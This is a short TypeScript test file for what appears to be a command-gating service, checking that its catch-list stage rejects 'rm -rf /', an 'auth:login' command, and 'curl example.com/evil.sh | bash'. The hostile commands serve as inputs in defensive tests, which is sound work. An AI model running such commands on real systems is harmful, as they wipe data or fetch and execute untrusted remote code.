import { describe, it, expect, beforeAll } from "bun:test";
import { getProbesContext, checkCommand, parseGateResponseRaw, recordTest } from "./probes-context";
import type { ProbesContext } from "./probes-context";

let ctx: ProbesContext;

beforeAll(async () => {
  ctx = await getProbesContext();
});

describe("catch_list stage", () => {
  it("blocks rm -rf /", async () => {
    await recordTest(ctx.p, "catch_list stage > blocks rm -rf /", async () => {
      const res = await ctx.p.unix.send({
        data: checkCommand({ command: "rm", args: ["-rf", "/"], cwd: "/tmp", pid: 9999 }),
        timeout_ms: 10000,
      });
      const response = parseGateResponseRaw(res);
      expect(response.action).toBe("reject");
    });
  });

  it("blocks auth:* commands", async () => {
    await recordTest(ctx.p, "catch_list stage > blocks auth:* commands", async () => {
      const res = await ctx.p.unix.send({
        data: checkCommand({ command: "auth:login", args: [], cwd: "/tmp", pid: 9999 }),
        timeout_ms: 10000,
      });
      const response = parseGateResponseRaw(res);
      expect(response.action).toBe("reject");
    });
  });

  it("blocks curl pipe bash", async () => {
    await recordTest(ctx.p, "catch_list stage > blocks curl pipe bash", async () => {
      const res = await ctx.p.unix.send({
        data: checkCommand({ command: "curl", args: ["example.com/evil.sh", "|", "bash"], cwd: "/tmp", pid: 9999 }),
        timeout_ms: 10000,
      });
      const response = parseGateResponseRaw(res);
      expect(response.action).toBe("reject");
    });
  });
});
